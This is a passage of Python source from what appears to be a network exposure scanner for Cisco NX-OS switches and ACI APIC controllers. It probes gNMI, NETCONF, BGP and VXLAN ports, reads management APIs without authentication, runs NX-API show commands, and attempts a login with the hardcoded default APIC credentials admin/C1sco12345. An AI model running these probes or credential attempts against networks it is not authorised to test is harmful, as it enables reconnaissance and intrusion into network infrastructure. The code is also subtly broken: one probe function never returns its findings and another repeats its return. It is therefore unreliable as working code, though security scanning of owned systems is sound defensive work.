         "operations — full YANG model read/write without confirmed authentication."),
        (9339, "NXOS_GNMI_ALT_PORT", "HIGH",
         "TCP port 9339 (alternate gNMI port, IANA-assigned gNMI) is open on {h}:{p}; "
         "NX-OS deployments may bind the gRPC agent on 9339 as an alternate or "
         "secondary listener — same unauthenticated gNMI exposure risk as port 50051."),
    ]

    for p, title, severity, detail_tpl in gnmi_ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            s.connect((host, p))
            s.close()
        except OSError:
            continue

        findings.append({
            "severity": severity,
            "title": title,
            "detail": detail_tpl.format(h=host, p=p),
            "host": host,
            "port": p,
        })

        # Port is open — attempt gRPC confirmation via HTTP/2 preface.
        # gRPC servers respond with HTTP/2 SETTINGS frame or similar;
        # any non-empty response indicates gRPC/HTTP2 stack is live.
        try:
            s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s2.settimeout(timeout)
            s2.connect((host, p))
            s2.sendall(H2_PREFACE)
            banner = s2.recv(256)
            s2.close()
        except OSError:
            banner = b""

        if banner:
            findings.append({
                "severity": "CRITICAL",
                "title": "NXOS_GRPC_RESPONDS",
                "detail": (
                    f"HTTP/2 client preface sent to {host}:{p} received {len(banner)}-byte "
                    "response — gRPC service confirmed active; NX-OS gRPC agent (Google "
                    "Protobuf encoding) may accept gNMI Get/Set/Subscribe RPCs without "
                    "authentication, granting full read/write access to all YANG model "
                    "paths including interface config, routing tables, and ACLs."
                ),
                "host": host,
                "port": p,
            })

    return findings


def probe_nxos_openconfig(host: str, port: int = 443, timeout: float = 10.0) -> list:
    """Probe NX-OS RESTCONF OpenConfig and IETF YANG model endpoints.

    NX-OS 9.3(x) exposes RESTCONF (draft-ietf-netconf-restconf-10) over HTTPS
    with support for Cisco-native, OpenConfig, and IETF YANG models.
    Unauthenticated access to these paths discloses full network topology,
    BGP peering config, interface addressing, and the complete YANG model
    inventory — all directly actionable for network re-routing or hijacking.
    """
    import ssl
    import urllib.request
    import urllib.error

    findings = []

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    base = f"https://{host}:{port}"
    headers = {
        "Accept": "application/yang-data+json, application/json",
        "Content-Type": "application/yang-data+json",
    }

    endpoints = [
        (
            "/restconf/data/openconfig-interfaces:interfaces",
            "HIGH",
            "NXOS_OPENCONFIG_INTERFACES_UNAUTH",
            "GET /restconf/data/openconfig-interfaces:interfaces returned 200 unauthenticated "
            "on {h}:{p}; OpenConfig interface model exposes full layer-2/3 interface "
            "configuration (IP addresses, VLANs, port state, MTU, speed) for all switch "
            "interfaces — direct network topology disclosure ({n} bytes).",
        ),
        (
            "/restconf/data/openconfig-bgp:bgp",
            "CRITICAL",
            "NXOS_OPENCONFIG_BGP_UNAUTH",
            "GET /restconf/data/openconfig-bgp:bgp returned 200 unauthenticated on {h}:{p}; "
            "OpenConfig BGP model exposes full BGP peering configuration: neighbor IPs, "
            "ASNs, route policies, session state, and prefix counts — enables BGP "
            "hijacking, route injection, and AS-path analysis ({n} bytes).",
        ),
        (
            "/restconf/yang-library-version",
            "MEDIUM",
            "NXOS_YANG_LIBRARY_EXPOSED",
            "GET /restconf/yang-library-version returned 200 unauthenticated on {h}:{p}; "
            "YANG library version endpoint discloses supported model revision dates — "
            "reveals NX-OS software version, installed YANG modules, and which "
            "OpenConfig/IETF model revisions are active for targeted exploitation ({n} bytes).",
        ),
        (
            "/restconf/data/ietf-interfaces:interfaces",
            "HIGH",
            "NXOS_RESTCONF_IETF_UNAUTH",
            "GET /restconf/data/ietf-interfaces:interfaces returned 200 unauthenticated "
            "on {h}:{p}; IETF RFC 7223 interfaces model exposes interface names, types, "
            "admin/oper state, and statistics for all device interfaces — "
            "network mapping and availability enumeration without credentials ({n} bytes).",
        ),
    ]

    for path, severity, title, detail_tpl in endpoints:
        url = f"{base}{path}"
        req = urllib.request.Request(url, method="GET", headers=headers)
        try:
            opener = urllib.request.build_opener(
                urllib.request.HTTPSHandler(context=ctx)
            )
            resp = opener.open(req, timeout=timeout)
            status = resp.status
            body = resp.read(4096)
        except urllib.error.HTTPError as e:
            status = e.code
            body = b""
        except (urllib.error.URLError, OSError):
            status = None
            body = b""

        if status == 200:
            findings.append({
                "severity": severity,
                "title": title,
                "detail": detail_tpl.format(h=host, p=port, n=len(body)),
                "host": host,
                "port": port,
            })


def probe_nxos_netconf(host: str, port: int = 830, timeout: float = 10.0) -> list:
    """NETCONF agent exposure and RESTCONF interface reachability on NX-OS.

    NETCONF (RFC 6241) runs over SSH on port 830.  NX-OS 9.3(x) ships the
    NETCONF agent enabled when ``feature netconf-agent`` is configured; the
    agent exposes the full Cisco-NX-OS-device YANG model (namespace
    http://cisco.com/ns/yang/cisco-nx-os-device) for configuration reads and
    writes.  RESTCONF (RFC 8040) is a companion REST transport for the same
    YANG data trees and binds to the management HTTPS port (443/8443).

    Checks (in order):
    1. TCP connect to port 830  -> NETCONF SSH subsystem reachable.
    2. Raw SSH banner read       -> confirms SSH-2.0 protocol exchange is live.
    3. RESTCONF /data/Cisco-NX-OS-device:System (200 or 401) -> interface up.
    4. RESTCONF /data/ root tree unauthenticated 200 -> full model enumeration.
    """
    findings: list = []

    # --- 1. TCP connect port 830 -------------------------------------------
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
        sock.close()
        findings.append({
            "severity": "HIGH",
            "title": "NXOS_NETCONF_PORT_OPEN",
            "detail": (
                f"TCP connect to {host}:{port} succeeded; NETCONF port is "
                "accessible.  The NETCONF SSH subsystem (RFC 6241) provides "
                "model-driven configuration read/write over the full "
                "Cisco-NX-OS-device YANG tree — a privileged management "
                "channel exposed to the network."
            ),
            "host": host,
            "port": port,
        })

        # --- 2. SSH banner read -------------------------------------------
        try:
            sock2 = socket.create_connection((host, port), timeout=timeout)
            sock2.settimeout(timeout)
            banner = sock2.recv(256)
            sock2.close()
            if b"SSH-2.0" in banner:
                findings.append({
                    "severity": "HIGH",
                    "title": "NXOS_NETCONF_SSH_BANNER",
                    "detail": (
                        f"NETCONF over SSH is actively responding on {host}:{port}; "
                        f"SSH-2.0 banner received: {banner[:64].decode('ascii', errors='replace').strip()!r}.  "
                        "An SSH-capable client can negotiate the netconf subsystem "
                        "and issue <get-config>/<edit-config> RPCs against the "
                        "running datastore without additional HTTP infrastructure."
                    ),
                    "host": host,
                    "port": port,
                })
        except OSError:
            pass

    except OSError:
        pass

    # --- 3 & 4. RESTCONF management interface (port 443) -------------------
    https_port = 443
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    base = f"https://{host}:{https_port}"
    headers = {
        "Accept": "application/yang-data+json, application/json",
        "User-Agent": "ablation/1.0",
    }

    # 3. RESTCONF Cisco-NX-OS-device:System — 200 or 401 means interface is up
    rc_system = f"{base}/restconf/data/Cisco-NX-OS-device:System"
    req = urllib.request.Request(rc_system, method="GET", headers=headers)
    try:
        opener = urllib.request.build_opener(
            urllib.request.HTTPSHandler(context=ctx)
        )
        resp = opener.open(req, timeout=timeout)
        rc_status = resp.status
        rc_body = resp.read(512)
    except urllib.error.HTTPError as e:
        rc_status = e.code
        rc_body = b""
    except (urllib.error.URLError, OSError):
        rc_status = None
        rc_body = b""

    if rc_status in (200, 401):
        findings.append({
            "severity": "HIGH",
            "title": "NXOS_RESTCONF_REACHABLE",
            "detail": (
                f"GET /restconf/data/Cisco-NX-OS-device:System returned HTTP "
                f"{rc_status} on {host}:{https_port}; the RESTCONF interface "
                "is active on the management port.  RESTCONF exposes the same "
                "YANG data trees as the NETCONF agent via REST — full device "
                "configuration is readable/writable by authenticated clients "
                "and may be reachable without authentication depending on AAA "
                "policy (HTTP 401 = interface up, credentials required; "
                "HTTP 200 = unauthenticated access confirmed)."
            ),
            "host": host,
            "port": https_port,
        })

    # 4. RESTCONF /data/ root — 200 = full model tree without auth
    rc_root = f"{base}/restconf/data/"
    req2 = urllib.request.Request(rc_root, method="GET", headers=headers)
    try:
        opener2 = urllib.request.build_opener(
            urllib.request.HTTPSHandler(context=ctx)
        )
        resp2 = opener2.open(req2, timeout=timeout)
        root_status = resp2.status
        root_body = resp2.read(4096)
    except urllib.error.HTTPError as e:
        root_status = e.code
        root_body = b""
    except (urllib.error.URLError, OSError):
        root_status = None
        root_body = b""

    if root_status == 200:
        findings.append({
            "severity": "CRITICAL",
            "title": "NXOS_RESTCONF_UNAUTH",
            "detail": (
                f"GET /restconf/data/ returned HTTP 200 unauthenticated on "
                f"{host}:{https_port}; the RESTCONF data model root is "
                "accessible without credentials, exposing the full YANG module "
                "tree (Cisco-NX-OS-device + OpenConfig + IETF models).  An "
                f"unauthenticated client can enumerate all supported YANG "
                "namespaces, read running configuration, and — if write access "
                f"is permitted — push <edit-config>-equivalent changes via "
                f"HTTP PATCH/PUT.  Response: {len(root_body)} bytes."
            ),
            "host": host,
            "port": https_port,
        })

    return findings


def probe_nxos_event_driven_automation(host: str, port: int = 443, timeout: float = 10.0) -> list:
    """Event-driven automation surface exposure on NX-OS.

    NX-OS 9.3(x) ships three on-box automation engines accessible via
    NX-API REST (DME paths under /api/mo/sys/):

    * EEM (Embedded Event Manager, eltm MO) — stores applet/script policies
      that execute CLI commands or Python on trigger events.  Policies may
      contain embedded credentials (``action syslog msg password=...``).
    * Scheduler (scheduler MO) — defines cron-style jobs with ``do-exec``
      payloads; job definitions frequently contain cleartext enable/line
      passwords.
    * on-box Python (python MO) — persistent script store for guestshell
      Python automation; may contain API keys and management credentials.

    All three paths are unauthenticated on misconfigured switches where
    ``no ip http authentication`` or default AAA policy allows unauthenticated
    NX-API access.  The CLI scheduler endpoint via ``/admin/exec/`` is the
    highest-severity path as it returns config verbatim including passwords.
    """
    findings: list = []

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    base = f"https://{host}:{port}"
    headers = {
        "Accept": "application/json",
        "User-Agent": "ablation/1.0",
    }

    endpoints = [
        (
            "/api/mo/sys/eltm.json",
            "HIGH",
            "NXOS_EEM_POLICIES_UNAUTH",
            (
                "GET /api/mo/sys/eltm.json returned HTTP 200 unauthenticated "
                "on {h}:{p}; the Embedded Event Manager policy store (eltm MO) "
                "is readable without credentials.  EEM applet and script "
                "policies contain trigger definitions, CLI action sequences, "
                "and may embed cleartext passwords used in ``action cli`` "
                "commands — direct credential and automation-logic disclosure "
                "({n} bytes)."
            ),
        ),
        (
            "/api/mo/sys/scheduler.json",
            "CRITICAL",
            "NXOS_SCHEDULER_UNAUTH",
            (
                "GET /api/mo/sys/scheduler.json returned HTTP 200 "
                "unauthenticated on {h}:{p}; NX-OS scheduler job definitions "
                "are exposed without authentication.  Scheduler jobs store "
                "``do-exec`` command sequences and cron schedules — job "
                "payloads routinely contain cleartext enable passwords and "
                "management credentials embedded in CLI strings ({n} bytes)."
            ),
        ),
        (
            "/admin/exec/show+scheduler+config",
            "CRITICAL",
            "NXOS_SCHEDULER_CONFIG_UNAUTH",
            (
                "GET /admin/exec/show+scheduler+config returned HTTP 200 "
                "unauthenticated on {h}:{p}; the NX-OS scheduler running "
                "configuration is exposed via the CLI exec endpoint.  This "
                "output is the verbatim ``show scheduler config`` output and "
                "includes all job names, cron schedules, and embedded "
                "command strings with cleartext passwords ({n} bytes)."
            ),
        ),
        (
            "/api/mo/sys/python.json",
            "HIGH",
            "NXOS_PYTHON_SCRIPT_STORE_UNAUTH",
            (
                "GET /api/mo/sys/python.json returned HTTP 200 unauthenticated "
                "on {h}:{p}; the on-box Python script store (python MO) is "
                "readable without credentials.  Persistent Python scripts in "
                "the NX-OS guestshell environment frequently contain hardcoded "
                "API tokens, SNMP community strings, and management platform "
                "credentials ({n} bytes)."
            ),
        ),
    ]

    for path, severity, title, detail_tpl in endpoints:
        url = f"{base}{path}"
        req = urllib.request.Request(url, method="GET", headers=headers)
        try:
            opener = urllib.request.build_opener(
                urllib.request.HTTPSHandler(context=ctx)
            )
            resp = opener.open(req, timeout=timeout)
            status = resp.status
            body = resp.read(4096)
        except urllib.error.HTTPError as e:
            status = e.code
            body = b""
        except (urllib.error.URLError, OSError):
            status = None
            body = b""

        if status == 200:
            findings.append({
                "severity": severity,
                "title": title,
                "detail": detail_tpl.format(h=host, p=port, n=len(body)),
                "host": host,
                "port": port,
            })

    return findings

    return findings


def probe_nxos_vxlan_vtep_exposure(host: str, port: int = 4789, timeout: float = 10.0) -> list:
    """Detect exposed VXLAN VTEP and BGP EVPN control-plane attack surface on NX-OS.

    VXLAN (RFC 7348) transports Ethernet frames over UDP port 4789.  In a
    Cisco NX-OS BGP EVPN fabric ("Building Data Centers with VXLAN BGP EVPN,"
    Cisco Press 2017), every leaf switch running ``feature vn-segment-vlan-based``
    and ``feature nv overlay`` exposes a VTEP (Virtual Tunnel Endpoint) on its
    loopback address.  The BGP EVPN control plane (AFI 25 L2VPN / SAFI 70,
    RFC 7432) distributes MAC/IP bindings between VTEPs on TCP/179 and is the
    authoritative source for VNI-to-VTEP membership, anycast gateway addresses,
    and inter-tenant route leaking policy.

    An internet-reachable VTEP allows an off-fabric attacker to inject arbitrary
    encapsulated Ethernet frames into any VNI without authentication (VXLAN has
    no built-in auth or encryption).  An accessible BGP/EVPN port allows
    injection of false MAC/IP (Type-2), inclusive multicast (Type-3), or IP
    prefix (Type-5) routes, redirecting tenant traffic across the entire fabric.

    Checks (in order):
    1. UDP 4789: minimal VXLAN probe -> any response = VTEP responsive.
    2. TCP 179: connect -> BGP port reachable.
    3. TCP 179: BGP OPEN with EVPN capability -> peer responds.
    4. BGP OPEN response: AFI=25/SAFI=70 in capabilities -> EVPN confirmed.
    5. NX-API POST /ins 'show vxlan' on 80/443 -> unauthenticated VTEP table.
    6. VTEP peer IPs in 'show vxlan' response -> peer disclosure.
    7. NX-API POST /ins 'show interface loopback' -> loopback IP disclosure.
    """
    findings: list = []

    # --- 1. UDP 4789: VXLAN VTEP probe ----------------------------------------
    # VXLAN header (RFC 7348, 8 bytes):
    #   Flags word (I-bit set at position 3 of byte 0 = 0x08000000 big-endian),
    #   then 3-byte VNI=0 followed by 1 reserved byte.
    # Inner Ethernet (14 bytes): broadcast DA, local SA, IPv4 ethertype.
    vxlan_hdr = struct.pack(">I", 0x08000000) + b"\x00\x00\x00" + b"\x00"
    inner_eth = (
        b"\xff\xff\xff\xff\xff\xff"   # DA: broadcast
        b"\x02\x00\x00\x00\x00\x01"  # SA: locally administered
        b"\x08\x00"                   # Ethertype: IPv4
    )
    probe_pkt = vxlan_hdr + inner_eth
    try:
        udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        udp_sock.settimeout(timeout)
        udp_sock.sendto(probe_pkt, (host, port))
        try:
            data, _ = udp_sock.recvfrom(256)
            if data:
                findings.append({
                    "severity": "CRITICAL",
                    "title": "VXLAN_VTEP_RESPONSIVE",
                    "detail": (
                        f"VXLAN VTEP on {host}:{port}/udp responded to an "
                        f"unauthenticated probe packet ({len(data)} bytes).  "
                        "An exposed VTEP allows an off-fabric attacker to inject "
                        "arbitrary encapsulated Ethernet frames into any VNI, "
                        "bypassing tenant isolation and enabling MAC/ARP spoofing "
                        "across VXLAN segments.  VXLAN provides no built-in "
                        "authentication or encryption (RFC 7348)."
                    ),
                    "host": host,
                    "port": port,
                })
        except socket.timeout:
            pass
        udp_sock.close()
    except OSError:
        pass

    # --- 2 & 3 & 4. BGP port 179: TCP connect + OPEN + EVPN capability ------
    bgp_port = 179
    try:
        bgp_sock = socket.create_connection((host, bgp_port), timeout=timeout)
        findings.append({
            "severity": "HIGH",
            "title": "BGP_EVPN_PORT_OPEN",
            "detail": (
                f"TCP connect to {host}:{bgp_port} succeeded; BGP port is "
                "accessible from an external source.  In a VXLAN BGP EVPN "
                "fabric (AFI 25 / SAFI 70), this port carries the full "
                "MAC/IP binding table, VTEP reachability (Type-3 routes), "
                "and IP prefix advertisements (Type-5 routes) — the complete "
                "fabric topology is distributed over this session."
            ),
            "host": host,
            "port": bgp_port,
        })

        # Build a minimal BGP OPEN with EVPN Multiprotocol Extensions capability.
        # Capability: code=1 (MP-BGP, RFC 2858), len=4, AFI=25, reserved=0, SAFI=70
        cap_data = struct.pack(">H", 25) + bytes([0, 70])   # AFI + rsvd + SAFI
        capability = bytes([1, len(cap_data)]) + cap_data   # cap code=1, len=4
        opt_param = bytes([2, len(capability)]) + capability  # opt type=2 (caps)

        bgp_open_body = (
            bytes([4])                  # BGP version 4
            + struct.pack(">H", 65001)  # My AS
            + struct.pack(">H", 90)     # Hold time (90s)
            + bytes([10, 0, 0, 1])      # BGP ID: 10.0.0.1
            + bytes([len(opt_param)])   # Opt params length
            + opt_param
        )
        marker = b"\xff" * 16
        msg_len = 19 + len(bgp_open_body)
        bgp_msg = marker + struct.pack(">H", msg_len) + bytes([1]) + bgp_open_body

        bgp_sock.sendall(bgp_msg)
        bgp_sock.settimeout(timeout)
        try:
            resp = bgp_sock.recv(256)
            if resp and len(resp) >= 19 and resp[:16] == b"\xff" * 16:
                findings.append({
                    "severity": "CRITICAL",
                    "title": "BGP_EVPN_OPEN_RESPONSIVE",
                    "detail": (
                        f"BGP peer on {host}:{bgp_port} responded to a BGP OPEN "
                        f"message ({len(resp)} bytes).  An unauthenticated BGP "
                        "session allows an attacker to advertise malicious MAC/IP "
                        "routes (Type-2), VTEP reachability (Type-3), or inject "
                        "false IP prefixes (Type-5) into the EVPN control plane, "
                        "redirecting tenant traffic across VNIs."
                    ),
                    "host": host,
                    "port": bgp_port,
                })
                # Byte 18 (0-indexed) is the BGP message type; 0x01 = OPEN
                if len(resp) > 18 and resp[18:19] == b"\x01":
                    # Scan for AFI=25 SAFI=70 in the capabilities
                    if b"\x00\x19\x00\x46" in resp or b"\x00\x19\x46" in resp:
                        findings.append({
                            "severity": "HIGH",
                            "title": "BGP_EVPN_CAPABILITY_DETECTED",
                            "detail": (
                                f"BGP OPEN response from {host}:{bgp_port} "
                                "advertises EVPN capability (AFI 25 L2VPN / "
                                "SAFI 70 BGP EVPN, RFC 7432).  This confirms "
                                "an active BGP EVPN fabric peer — VTEP MAC/IP "
                                "binding tables, tenant VNI assignments, and "
                                "inter-VTEP reachability routes are carried on "
                                "this session."
                            ),
                            "host": host,
                            "port": bgp_port,
                        })
        except socket.timeout:
            pass
        bgp_sock.close()
    except OSError:
        pass

    # --- 5, 6, 7. NX-API CLI /ins endpoint on HTTP:80 and HTTPS:443 ----------
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    for scheme, api_port in [("http", 80), ("https", 443)]:
        base_url = f"{scheme}://{host}:{api_port}"

        def _nxapi_post(cmd: str, _scheme: str = scheme, _base: str = base_url) -> tuple:
            payload = json.dumps({
                "ins_api": {
                    "version": "1.0",
                    "type": "cli_show",
                    "chunk": "0",
                    "sid": "1",
                    "input": cmd,
                    "output_format": "json",
                }
            }).encode()
            req = urllib.request.Request(
                f"{_base}/ins",
                data=payload,
                method="POST",
                headers={
                    "Content-Type": "application/json",
                    "Accept": "application/json",
                    "User-Agent": "ablation/1.0",
                },
            )
            try:
                opener = urllib.request.build_opener(
                    urllib.request.HTTPSHandler(context=ctx) if _scheme == "https"
                    else urllib.request.HTTPHandler()
                )
                resp = opener.open(req, timeout=timeout)
                return resp.status, resp.read(65536)
            except urllib.error.HTTPError as e:
                return e.code, b""
            except (urllib.error.URLError, OSError):
                return None, b""

        # show vxlan: discloses NVE peer table and VNI-to-VLAN mappings
        status, body = _nxapi_post("show vxlan")
        if status == 200 and body:
            try:
                data = json.loads(body)
                raw = json.dumps(data).lower()
                if any(kw in raw for kw in ("vxlan", "vtep", "vni", "nve")):
                    findings.append({
                        "severity": "CRITICAL",
                        "title": "NXAPI_VXLAN_SHOW_UNAUTH",
                        "detail": (
                            f"POST /ins 'show vxlan' returned HTTP 200 unauthenticated "
                            f"on {host}:{api_port}; NX-API CLI exec is accessible "
                            "without credentials.  'show vxlan' discloses the VTEP "
                            "source interface, NVE peer addresses, and VNI-to-VLAN "
                            "mappings — full fabric topology is exposed "
                            f"({len(body)} bytes)."
                        ),
                        "host": host,
                        "port": api_port,
                    })
                    # Extract IP addresses from the VTEP disclosure
                    vtep_ips = re.findall(
                        r"\b(?:(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}"
                        r"(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\b",
                        body.decode("utf-8", errors="replace"),
                    )
                    if vtep_ips:
                        findings.append({
                            "severity": "CRITICAL",
                            "title": "NXAPI_VTEP_IPS_DISCLOSED",
                            "detail": (
                                f"'show vxlan' response from {host}:{api_port} "
                                f"contains {len(vtep_ips)} IP address(es) including "
                                "potential VTEP peers: "
                                f"{', '.join(vtep_ips[:8])}.  Each disclosed IP is "
                                "a reachable VTEP that can be probed for additional "
                                "fabric nodes and VNI membership."
                            ),
                            "host": host,
                            "port": api_port,
                        })
            except (ValueError, KeyError):
                pass

        # show interface loopback: discloses VTEP source addresses and BGP router IDs
        status, body = _nxapi_post("show interface loopback")
        if status == 200 and body:
            try:
                data = json.loads(body)
                raw = json.dumps(data).lower()
                if any(kw in raw for kw in ("loopback", "interface", "lo0")):
                    findings.append({
                        "severity": "HIGH",
                        "title": "NXAPI_LOOPBACK_DISCLOSED",
                        "detail": (
                            f"POST /ins 'show interface loopback' returned HTTP 200 "
                            f"unauthenticated on {host}:{api_port}.  Loopback "
                            "interfaces in a VXLAN BGP EVPN fabric serve as VTEP "
                            "source addresses and BGP router IDs — disclosing them "
                            "reveals the fabric underlay addressing scheme and "
                            f"identifies all VTEP endpoints ({len(body)} bytes)."
                        ),
                        "host": host,
                        "port": api_port,
                    })
            except (ValueError, KeyError):
                pass

    return findings


def probe_nxos_aci_apic_exposure(host: str, port: int = 443, timeout: float = 10.0) -> list:
    """Detect exposed Cisco ACI APIC controller management API.

    The Cisco Application Policy Infrastructure Controller (APIC) is the SDN
    controller for ACI (Application Centric Infrastructure) fabrics.  APIC
    exposes a REST API on HTTPS/443 consumed by the APIC GUI and automation
    tooling.  The object model (MO) hierarchy maps directly to ACI policy
    constructs: Tenant (fvTenant) -> VRF (fvCtx) -> Bridge Domain (fvBD) ->
    EPG (fvAEPg), governed by Security Contracts (vzBrCP).

    In a misconfigured or unpatched APIC, the /api/node/class/* endpoints return
    200 OK without an APIC-Cookie session token, exposing the full fabric policy
    model to unauthenticated reads.  Default credentials (admin/C1sco12345) are
    commonly left unchanged in lab and staged deployments.  CVE-2021-1577
    (CVSS 9.1) allows unauthenticated read of arbitrary files via the APIC REST
    API, including PKI certificates.

    Checks (in order):
    1. GET /api/node/class/topSystem.json -> fabric topology (node IDs, IPs, roles).
    2. POST /api/aaaLogin.json admin/C1sco12345 -> default credential acceptance.
    3. GET /api/node/class/fvTenant.json -> multitenant customer inventory.
    4. GET /api/node/class/fabricNode.json -> spine/leaf node enumeration.
    5. GET /api/node/class/fvBD.json -> bridge domain policy (VNI assignments).
    6. GET /api/node/class/vzBrCP.json -> security contracts (traffic policy map).
    7. GET / -> portal fingerprint via "Cisco APIC" in body.
    8. GET /api/node/class/pkiEp.json -> CVE-2021-1577 certificate disclosure.
    9. TCP 7777/8888 -> APIC internal Kafka/messaging bus exposed.
    10. TLS cert OU -> "dcapic" certificate pattern confirms APIC identity.
    """
    findings: list = []

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    base = f"https://{host}:{port}"
    _headers = {
        "Accept": "application/json",
        "User-Agent": "ablation/1.0",
    }

    def _get(path: str) -> tuple:
        """Return (status, body_bytes) or (None, b'') on network error."""
        req = urllib.request.Request(base + path, headers=_headers)
        try:
            opener = urllib.request.build_opener(
                urllib.request.HTTPSHandler(context=ctx)
            )
            resp = opener.open(req, timeout=timeout)
            return resp.status, resp.read(65536)
        except urllib.error.HTTPError as e:
            return e.code, b""
        except (urllib.error.URLError, OSError):
            return None, b""

    def _post(path: str, payload: bytes) -> tuple:
        """Return (status, body_bytes) or (None, b'') on network error."""
        req = urllib.request.Request(
            base + path,
            data=payload,
            method="POST",
            headers={**_headers, "Content-Type": "application/json"},
        )
        try:
            opener = urllib.request.build_opener(
                urllib.request.HTTPSHandler(context=ctx)
            )
            resp = opener.open(req, timeout=timeout)
            return resp.status, resp.read(65536)
        except urllib.error.HTTPError as e:
            return e.code, b""
        except (urllib.error.URLError, OSError):
            return None, b""

    # --- 1. topSystem: fabric topology disclosure ----------------------------
    status, body = _get("/api/node/class/topSystem.json")
    if status == 200 and body:
        findings.append({
            "severity": "CRITICAL",
            "title": "ACI_TOPSYSTEM_UNAUTH",
            "detail": (
                f"GET /api/node/class/topSystem.json returned HTTP 200 "
                f"unauthenticated on {host}:{port}; ACI fabric system topology "
                "is readable without credentials.  topSystem MO exposes node IDs, "
                "roles (spine/leaf/controller), IP addresses, pod IDs, serial "
                "numbers, and NX-OS version strings for every fabric node "
                f"({len(body)} bytes)."
            ),
            "host": host,
            "port": port,
        })

    # --- 2. Default admin credentials: admin/C1sco12345 ----------------------
    login_payload = json.dumps({
        "aaaUser": {"attributes": {"name": "admin", "pwd": "C1sco12345"}}
    }).encode()
    status, body = _post("/api/aaaLogin.json", login_payload)
    if status == 200 and b"token" in body.lower():
        findings.append({
            "severity": "CRITICAL",
            "title": "ACI_DEFAULT_ADMIN_CREDS",
            "detail": (
                f"POST /api/aaaLogin.json with admin/C1sco12345 returned HTTP 200 "
                f"and a session token on {host}:{port}.  Default Cisco APIC "
                "administrator credentials are accepted — full read/write access "
                "to the ACI policy model including tenant creation, contract "
                "modification, and fabric node configuration."
            ),
            "host": host,
            "port": port,
        })

    # --- 3. fvTenant: multitenant customer inventory -------------------------
    status, body = _get("/api/node/class/fvTenant.json")
    if status == 200 and body:
        findings.append({
            "severity": "CRITICAL",
            "title": "ACI_TENANT_LIST_UNAUTH",
            "detail": (
                f"GET /api/node/class/fvTenant.json returned HTTP 200 "
                f"unauthenticated on {host}:{port}; ACI tenant list is readable "
                "without credentials.  fvTenant MO exposes all tenant names, "
                "descriptions, and child object counts — disclosing the full "
                f"multitenant customer inventory of the ACI fabric ({len(body)} bytes)."
            ),
            "host": host,
            "port": port,
        })

    # --- 4. fabricNode: spine/leaf node enumeration --------------------------
    status, body = _get("/api/node/class/fabricNode.json")
    if status == 200 and body:
        findings.append({
            "severity": "CRITICAL",
            "title": "ACI_FABRIC_NODES_UNAUTH",
            "detail": (
                f"GET /api/node/class/fabricNode.json returned HTTP 200 "
                f"unauthenticated on {host}:{port}; ACI fabric node inventory "
                "is readable without credentials.  fabricNode MO exposes every "
                "spine and leaf: node ID, IP address, serial number, model, "
                f"firmware version, and role ({len(body)} bytes)."
            ),
            "host": host,
            "port": port,
        })

    # --- 5. fvBD: bridge domain policy (VNI assignments) --------------------
    status, body = _get("/api/node/class/fvBD.json")
    if status == 200 and body:
        findings.append({
            "severity": "HIGH",
            "title": "ACI_BRIDGE_DOMAINS_UNAUTH",
            "detail": (
                f"GET /api/node/class/fvBD.json returned HTTP 200 unauthenticated "
                f"on {host}:{port}; ACI bridge domain configuration is readable "
                "without credentials.  fvBD MO discloses L2/L3 domain mappings, "
                "subnet assignments, unicast routing settings, and associated "
                f"VNI allocations — fabric policy structure exposed ({len(body)} bytes)."
            ),
            "host": host,
            "port": port,
        })

    # --- 6. vzBrCP: security contracts (inter-EPG traffic policy) ------------
    status, body = _get("/api/node/class/vzBrCP.json")
    if status == 200 and body:
        findings.append({
            "severity": "CRITICAL",
            "title": "ACI_SECURITY_CONTRACTS_UNAUTH",
            "detail": (
                f"GET /api/node/class/vzBrCP.json returned HTTP 200 unauthenticated "
                f"on {host}:{port}; ACI security contracts are readable without "
                "credentials.  vzBrCP MO exposes inter-EPG communication policy "
                "including permitted protocols, port filters, and QoS classes — "
                "an attacker can map all allowed traffic paths between tenant "
                f"endpoint groups ({len(body)} bytes)."
            ),
            "host": host,
            "port": port,
        })

    # --- 7. Portal fingerprint: "Cisco APIC" in root response ----------------
    status, body = _get("/")
    if status in (200, 301, 302) and b"Cisco APIC" in body:
        findings.append({
            "severity": "MEDIUM",
            "title": "ACI_APIC_PORTAL",
            "detail": (
                f"GET / on {host}:{port} returned 'Cisco APIC' in the response "
                "body — APIC management portal is publicly reachable.  Exposed "
                "web UI confirms APIC controller identity and presents a login "
                "surface for credential-stuffing and brute-force attacks."
            ),
            "host": host,
            "port": port,
        })

    # --- 8. CVE-2021-1577: unauthenticated APIC PKI/cert read ---------------
    status, body = _get("/api/node/class/pkiEp.json")
    if status == 200 and body:
        findings.append({
            "severity": "CRITICAL",
            "title": "ACI_CERT_DISCLOSURE",
            "detail": (
                f"GET /api/node/class/pkiEp.json returned HTTP 200 unauthenticated "
                f"on {host}:{port}; PKI endpoint configuration is exposed "
                "(related to CVE-2021-1577, CVSS 9.1).  pkiEp MO may disclose "
                "certificate data, key labels, and PKI policy configuration used "
                f"for device authentication across the ACI fabric ({len(body)} bytes)."
            ),
            "host": host,
            "port": port,
        })

    # --- 9. Internal Kafka/messaging bus on 7777/8888 -----------------------
    for bus_port in (7777, 8888):
        try:
            s = socket.create_connection((host, bus_port), timeout=timeout)
            s.close()
            findings.append({
                "severity": "HIGH",
                "title": "ACI_INTERNAL_BUS_EXPOSED",
                "detail": (
                    f"TCP connect to {host}:{bus_port} succeeded; APIC internal "
                    "messaging/Kafka bus port is reachable from an external "
                    "source.  The APIC internal bus carries inter-process and "
                    "inter-controller messages including policy push events, "
                    "fault notifications, and configuration replication — "
                    "exposure may allow message injection or eavesdropping on "
                    "fabric control-plane state changes."
                ),
                "host": host,
                "port": bus_port,
            })
        except OSError:
            pass

